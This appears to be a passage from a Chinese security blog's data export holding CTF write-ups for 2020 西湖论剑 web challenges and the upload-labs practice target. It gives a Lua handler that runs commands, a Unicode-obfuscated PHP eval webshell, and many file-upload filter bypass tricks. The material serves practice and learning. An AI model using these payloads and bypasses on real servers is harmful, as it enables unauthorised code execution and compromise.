大佬的脚本好像出了点问题，下次再写吧","categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"2020西湖论剑-web复现","slug":"CTF比赛/2020西湖论剑/2020西湖论剑","date":"2021-04-02T08:06:06.000Z","updated":"2021-05-19T12:51:06.003Z","comments":true,"path":"2021/04/02/CTF比赛/2020西湖论剑/2020西湖论剑/","link":"","permalink":"http://example.com/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/","excerpt":"","text":"2020 西湖论剑前言记得当时第一次参加比赛，虐的好惨，题目很好，网速很快，就是做不出，全程凑数，新手村的我刚出门就直接面对百级 boss，没有任何游戏体验。重新开始，今年继续 1.NewUload 文件上传，过滤了文件后缀名和文件内容都过滤了 php 关键字，甚至短标签的尖括号都不行，但是，没想到居然可以通过换行来绕过后缀名检测和用图片马来绕过文件内容的检测。 就能从 phpinfo 中发现 disable_functions 中禁用了很多函数。网上有两种方法 第一种就是利用.htaccess+lua。lua 是也是一种轻量化脚本语言，在 PHP 环境中可以被解析 先上传一个.htaccess 文件，作用是使 lua 文件解析生效。 12.htaccesAddHandler lua-script .lua 然后上传一个 1.lua 文件，再访问 1.lua 就能成功得到 flag。 1234567891011121314151617181920212223--[1.lua --]require &quot;string&quot;--[[ This is the default method name for Lua handlers, see the optional function-name in the LuaMapHandler directive to choose a different entry point.--]]function handle(r) r.content_type = &quot;text/plain&quot; r:puts(&quot;Hello Lua World!\\n&quot;) local t = io.popen(&#x27;/readflag&#x27;) local a = t:read(&quot;*all&quot;) r:puts(a) if r.method == &#x27;GET&#x27; then for k, v in pairs( r:parseargs() ) do r:puts( string.format(&quot;%s: %s\\n&quot;, k, v) ) end else r:puts(&quot;Unsupported HTTP method &quot; .. r.method) endend 第二种方法是弹 shell，但是方法很复杂，有点难懂，参考大佬文章 参考https://blog.csdn.net/tm_1024/article/details/109056127 2.EasyJson 这题总的来说就是代码审计+（伪）文件上传+RCE, 主要考点就是绕过 json 格式 源码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &#x27;security.php&#x27;;if(!isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die();&#125;$sandbox = &#x27;sandbox/&#x27;.sha1($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]).&#x27;/&#x27;;//设置沙盒根据自己ip获得目录var_dump($sandbox);if(!file_exists($sandbox))&#123;//如果不存在就创建 mkdir($sandbox); file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;);&#125;$action = $_GET[&#x27;action&#x27;];$content = file_get_contents(&quot;php://input&quot;);//获得post数据流if($action == &quot;write&quot; &amp;&amp; SecurityCheck(&#x27;filename&#x27;,$_GET[&#x27;filename&#x27;]) &amp;&amp;SecurityCheck(&#x27;content&#x27;,$content))&#123;//验证函数 $content = json_decode($content);//json格式解密 $filename = $_GET[&#x27;filename&#x27;]; $filecontent = $content-&gt;content;//获得content变量的值 $filename = $sandbox.$filename; file_put_contents($filename,$filecontent.&quot;\\n Powered By Dbapp OSS.&quot;);//写入文件，利用点&#125;elseif($action == &quot;reset&quot;)&#123;//删除操作 $files = scandir($sandbox); foreach($files as $file) &#123; if(!is_dir($file))&#123; if($file !== &quot;index.php&quot;)&#123; unlink($sandbox.$file); &#125; &#125; &#125;&#125;else&#123; die(&#x27;Security Check Failed.&#x27;);&#125; get 要传入 action,filename 和 source 这三个参数。source 是保证下面的 php 命令可以执行，action 是我们要执行的操作，肯定是 write 了。filename 是我们要写的文件的名字。post 要传入 json 格式的参数，它的 content 键的值是我们要写入文件的内容。审清楚这些，应该做的就是写一个可以 RCE 的文件，因为我们写的文件的目录已知，文件名已知，然后再读取那个文件，用蚁剑连或者进行 RCE。 第一个绕过点是文件名。因为习惯性给文件命名 1.php，在这里直接没通过那个安全检测了。我一开始以为是后缀 php 被过滤，后来我把后缀去掉发现还是被阻了，然后我把文件改成了 feng.php 就好了，才发现只有字母给文件命名才行。接下来就是 post 传入的参数了。post 传入后赋给变量$content，但是$content 要被 json_decode 一次。我一开始尝试这样写&#123;&quot;content&quot;:&quot;&lt;?php eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;,发现爆 check fail。我尝试了大小写双写绕过后还是不行，然后就卡住了。。因为真的对 json 这个内容不太了解。 看了 WP，原来 content 里的 on 也被过滤了。这是我没想到的。怎么绕过呢？尝试用 unicode 编码来绕过。原理可以参考下面文章：浅谈 json 参数解析对 waf 绕过的影响 被过滤的全部使用 Unicode 编码之后即可，&#123;&quot;\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074&quot;:&quot;&lt;?\\u0070\\u0068\\u0070 eval($_GET[&#39;a&#39;]);?&gt;&quot;&#125;再访问一下http://easyjson.xhlj.wetolink.com/sandbox/9beb98a8de69744aec8456acc562a3685f92fabd/feng.php然后进行 RCE。通过查看 phpinfo，可以发现这题没有任何函数被禁用，因此获取 flag 就十分容易了。找到 security.php 的源码 123456789101112131415161718192021222324&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2020/2/7 * Time: 1:31 PM */function SecurityCheck($type,$content)&#123; switch ($type)&#123; case &#x27;filename&#x27;: if(preg_match(&quot;/[^a-z\\.]/&quot;, $content) !== 0) &#123; return false; &#125; return true; break; case &#x27;content&#x27;: if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;) || stristr($content,&#x27;php&#x27;) || stristr($content,&#x27;.&#x27;)) &#123; return false; &#125; return true; break; &#125;&#125; 文件名只能 a-z 的字母，对于 post 的参数，则过滤了 on,html,type,flag,upload,file,php 和. 参考https://blog.csdn.net/rfrder/article/details/109107736?https://blog.csdn.net/qq_46091464/article/details/108967312? 3.HardXss这题考的是 ServiceWorker， 简单的讲，是浏览器在后台独立于网页运行的脚本。可以简单的认为是一个介于客户端和服务端之间的代理服务器，最重要的作用之一就是缓存离线资源。 SW 提供了一组 API，能够拦截当前站点产生 HTTP 请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当 Cache Storage 不存在请求的资源时再向服务器请求,cache.put 可以选择性地将请求资源加载到 cache storage 中。如果不手动取消已经注册过的 sw 服务,刷新/重新打开页面都会启动站点的 sw 服务，这为我们持久化 XSS 提供了一定的条件。 已经找不到 writeup 了….那就这样吧。😅🤓","categories":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/categories/CTF%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"http://example.com/tags/CTF%E6%AF%94%E8%B5%9B/"}]},{"title":"upload-labs靶机练习","slug":"upload-labs/upload-labs","date":"2021-03-28T13:06:06.000Z","updated":"2021-04-23T15:27:01.847Z","comments":true,"path":"2021/03/28/upload-labs/upload-labs/","link":"","permalink":"http://example.com/2021/03/28/upload-labs/upload-labs/","excerpt":"","text":"一、后缀黑名单绕过1.前端 JS 绕过 可以直接更改 js 源码，允许上传 PHP 文件 也可以直接删除 2.只验证 Content-type123if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; 前端没有过滤，burp 抓包修改 content-type，绕过即可。 3.后缀名-黑名单绕过 源码 1234567891011121314151617181920212223if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; 不得不承认，这波黑名单搞得我有点头痛。。 新知识学习 1234用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件但可以上传.phtml .phps .php5 .pht前提是apache的httpd.conf中有如下配置代码AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht 可以在 apache 的配置文件中没有找到呀，但是好像也可以上传，但是访问上传文件时，自动将 php 脚本进行了 html 注释,没有任何显示 4.htaccess 绕过 源码 123456789if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 过滤是真的多。。。 没有过滤.htaccess,可以尝试下 12&lt;FilesMatch “4.jpg”&gt;SetHandler application&#x2F;x-httpd-php 创建一个.htaccess 文件，写入代码(内容为将 4.jpg 当做 php 文件解析)上传.htaccess 文件，再上传 4.jpg 图片马文件(马文件是通过图片和 php 结合的) 5..user.ini 绕过黑名单 依然过滤了很多，过滤了.htaccess 后缀，但是没有过滤点.int 文件 所以可以上传.user.ini 文件内容是auto_prepend_file=test.jpg让所有 php 文件都“自动”包含 test.jpg 文件 6.后缀名大小写绕过 没有对后缀名镜大小写转化。 7.空格绕过 源码 12345678if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 相比前面的题，这道没有后缀名去空处理，加空格即可绕过。注意这里仅仅是空格还是会有问题，需要在空格后面加上&#39; 8.点(.)绕过黑名单 提示后缀无法解析…. 源码 12345678if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 相比前面的题，没有了$file_name = deldot($file_name);//删除文件名末尾的点,点号绕过 9.::$DATA绕过 源码 1234567if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 相比前面的题，没有了$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA,没有对后缀名中的’::$DATA’进行过滤在php+windows的情况下文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名且保持”::$DATA”之前的文件名 10.点空点绕过 源码 123456789101112131415if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; 主要区别是图片的存储路径是文件名，保存文件的时候没有重命名而使用的原始的文件名可以使用1.php. .绕过 11.双写绕过 用 str_ireplace 把黑名单里的后缀全替换为空但是这个函数只进行一次替换$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 二、后缀白名单12.Get%00 截断 提示 源码 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 可以看到 get 方法的 save_path 是可以控制的，可以使用%00 截断我们可以抓包修改 get 的参数，然后通过 file_ext 无效，这样就可以上传 PHP 文件 %00 截断的概念和原理： 在URL中%00表示ASCII码中的0，而0作为特殊字符保留，表示字符结束 当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片 要求：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态 13.POST%00 截断 和上题的差距只是–由 GET 变成 POST 型还是利用 00 截断但是 POST 不会像 GET 对%00 进行自动解码需要在二进制中进行修改将 70 68 70 后面的 2b 改为 00 三、检查内容14.图片马绕过题目要求发生了变化 源码 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; rb 是读取二进制文件 后面的 fread 函数只读两字节，也就是说只对文件头进行了检测 unpack(format,data)函数是规定在解包数据时所使用的格式，这里是文件头按照 c 格式解包 intval() 函数用于获取变量的整数值 但直接访问图片并不能把图片当做 PHP 解析还需要利用文件包含漏洞www/upload-labs/upload 目录下建立一个 php 文件 15.图片马绕过 源码 1234567891011121314function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 使用 getimagesize()函数来获取图片的大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。。仍然可以使用图片马绕过。 16.图片马绕过 源码 123456789101112131415161718function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; &#125;&#125; 用 exif_imagetype 来判断文件的类型，仍然可以通过图片马绕过，成功上传，但是需要使用文件包含漏洞来访问对应文件 17.二次渲染绕过 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 判断了后缀名、content-type 利用 imagecreatefromgif 判断格式 二次渲染了上传的图片 绕过方法：找到渲染前后没有变化的位置,然后将 php 代码写进去,就可以成功上传带有 php 代码的图片假设这里使用图片马绕过，上传之后的图片中的 PHP 语句会被过滤掉针对 gif 文件上传，做个尝试在 hex 代码中找到前后没有变化的内容,将添加到 1.gif 的尾部，即可成功上传。针对 png 和 jpg 的二次渲染上传，可参考大佬文章 18.条件竞争 源码 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);//定义白名单 $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];//上传文件名 $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];//临时文件名路径名称 $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);//截取文件后缀名 $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;//拼接上传文件的路径名称 if(move_uploaded_file($temp_file, $upload_file))&#123;//将临时文件放到指定路径，如果成功执行 if(in_array($file_ext,$ext_arr))&#123;//判断文件后缀 $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;//生成新的文件名 rename($upload_file, $img_path);//对文件重命名，并将新的文件目录覆盖到原来的文件目录上 unlink($upload_file); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传失败！&#x27;; &#125;&#125; 先上传文件，然后白名单判断文件的后缀名，如果不符，则报错及删除文件，如果在白名单，则重命名。这就在文件的处理顺序上出现了问题，不管文件类型是否合格就上传至服务器，之后再对其类型进行判断，这样的处理顺序导致了在多线程的情况下，有可能对于不合格的文件还没来得及删除就已经被访问，导致不合格的文件绕过了限制 因此我们可以打个时间差：上传 1.php，只需要在它删除之前访问即可可以利用 burp 的 intruder 模块不断上传，然后我们不断的访问刷新该地址 